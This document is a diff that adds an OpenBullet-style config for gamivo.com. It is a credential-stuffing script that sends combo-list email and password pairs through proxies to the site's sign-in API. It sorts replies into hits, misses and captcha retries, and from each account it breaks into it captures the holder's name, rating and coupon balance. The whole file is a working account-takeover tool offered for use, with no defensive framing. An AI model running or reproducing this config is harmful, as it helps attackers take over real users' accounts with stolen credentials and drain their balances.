@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "gamivo.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-19T11:22:53.4380669+02:00",
+  "AdditionalInfo": "",
+  "Author": "Stringsko",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.gamivo.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+REQUEST POST "https://backend.gamivo.com/api/user/sign-in" AutoRedirect=FALSE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"captcha\":\"\"}" 
+  CONTENTTYPE "text/plain" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.gamivo.com" 
+  HEADER "Referer: https://www.gamivo.com/login" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "user.login.not.found" 
+  KEYCHAIN Success OR 
+    KEY "fullname" 
+  KEYCHAIN Retry OR 
+    KEY "Please verify yourself" 
+PARSE "<SOURCE>" LR "fullname\":\"" "\"," -> CAP "fullname" 
+PARSE "<SOURCE>" LR "\",\"rating\":" ",\"" -> CAP "rating" 
+PARSE "<SOURCE>" LR "coupon_balance\":" ",\"solvent" -> CAP "balance" 
